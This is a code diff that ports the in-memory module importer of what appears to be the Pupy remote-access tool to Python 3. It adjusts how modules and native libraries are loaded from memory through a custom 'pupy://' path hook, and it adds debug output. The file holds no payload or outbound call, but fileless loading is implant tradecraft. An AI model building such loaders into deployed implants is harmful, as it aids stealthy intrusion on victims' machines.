@@ -29,11 +29,6 @@
 
 # Public API
 
-from __future__ import absolute_import
-from __future__ import division
-from __future__ import print_function
-from __future__ import unicode_literals
-
 __all__ = (
     'EXTS_SOURCES', 'EXTS_COMPILED', 'EXTS_NATIVE', 'EXTS_ALL',
     'Blackhole', 'DummyPackageLoader', 'PupyPackageLoader',
@@ -59,17 +54,19 @@ __all__ = (
 
     'main'
 )
-
 import sys
-import importlib.util
 import marshal
 import gc
 
 os_ = None
 
+
 for module in ('nt', 'posix'):
     if module in sys.builtin_module_names:
         os_ = __import__(module)
+
+import importlib.util as imputil
+
 
 if sys.version_info.major > 2:
     xrange = range
@@ -93,7 +90,7 @@ try:
 
     # Reset search paths ASAP
 
-    del sys.meta_path[:]
+    #del sys.meta_path[:]
     del sys.path[:]
     del sys.path_hooks[:]
 
@@ -347,7 +344,8 @@ def import_module(data, initname, fullname, path):
     if not is_supported(_import_module):
         return None
 
-    return _import_module(data, initname, fullname, path)
+    spec = imputil.spec_from_loader(fullname, loader=None)
+    return _import_module(data, initname, fullname, path, spec)
 
 
 def load_dll(name, buf=None):
@@ -431,8 +429,8 @@ def get_module_files(fullname, paths=[None]):
 def make_module(fullname, path=None, is_pkg=False, mod=None):
     if mod is None:
         #mod = imp.new_module(fullname)
-        spec = importlib.util.spec_from_loader(fullname, loader=None)
-        mod = importlib.util.module_from_spec(spec)
+        spec = imputil.spec_from_loader(fullname, loader=None)
+        mod = imputil.module_from_spec(spec)
 
     mod.__name__ = str(fullname)
     mod.__file__ = str(
@@ -553,8 +551,10 @@ class PupyPackageLoader(object):
                 if not is_supported(_import_module):
                     raise ImportError(
                         'memimporter interface is not initialized yet')
-
-                initname = 'init' + fullname.rsplit('.', 1)[-1]
+                if sys.version_info[0]==3:
+                    initname = 'PyInit_' + fullname.rsplit('.', 1)[-1]
+                else:
+                    initname = 'init' + fullname.rsplit('.', 1)[-1]
 
                 dprint('Load {} from native file {}'.format(
                     fullname, self.path))
@@ -589,14 +589,17 @@ class PupyPackageLoader(object):
 class PupyPackageFinderImportError(ImportError):
     __slots__ = ()
 
-
-class PupyPackageFinder(object):
+import _frozen_importlib_external as _bootstrap_external
+class PupyPackageFinder(_bootstrap_external._LoaderBasics):
     __slots__ = ('path', 'locals', 'globals')
 
     search_lock = None
     search_set = set()
 
-    def __init__(self, path=None):
+    def __init__(self, path):
+        dprint("PupyPackageFinder for {}".format(path))
+        if type(path) == bytes:
+            path = path.decode('utf8', 'replace')
         if path and not path.startswith('pupy://'):
             raise PupyPackageFinderImportError()
 
@@ -693,6 +696,7 @@ class PupyPackageFinder(object):
                 yield first, True
 
     def find_module(self, fullname, path=None, second_pass=False):
+        dprint('Find module')
         if fullname.startswith('exposed_'):
             return None
 
@@ -797,6 +801,10 @@ class PupyPackageFinder(object):
 
             gc.collect()
 
+    def __repr__(self):
+        return 'PupyPackageFinder({!r})'.format(self.path)
+
+
 
 def initialize_basic_windows_modules():
     dprint('Initialize basic windows modules')
@@ -833,8 +841,9 @@ def load_pupyimporter(stdlib=None):
 
     if is_native():
         dprint('Install pupyimporter (standalone)')
-        sys.path = ['pupy://']
+        sys.path = ["pupy://"]
         sys.path_hooks = [PupyPackageFinder]
+        #sys.meta_path = [PupyPackageFinder("pupy://")]
 
     else:
         dprint('Install pupyimporter + local packages')
@@ -844,6 +853,12 @@ def load_pupyimporter(stdlib=None):
     sys.path_importer_cache.clear()
 
     PupyPackageFinder.init_search_lock()
+
+    del sys.modules["collections"]
+    del sys.modules["collections.abc"]
+    dprint("\n".join([x for x in sys.modules.keys()]))
+    import collections.abc
+    import collections
 
     if sys.platform == 'win32':
         initialize_basic_windows_modules()
@@ -858,7 +873,6 @@ def init_pupy(argv, stdlib, debug=False):
 
     set_stdio(null=not debug)
     set_debug(debug)
-
     dprint(
         'init_pupy: argv={} sys.argv={}',
         repr(argv), repr(sys.argv)
@@ -989,6 +1003,8 @@ def prepare(argv=sys.argv, debug=False, config={}, stdlib=None):
 
 
 def main(argv=sys.argv, debug=False, config={}, stdlib=None):
+    #import builtins
+    #builtins.open(2, 'w').write("here from python\n")
     prepare(argv, debug, config, stdlib)
 
     from .service import run
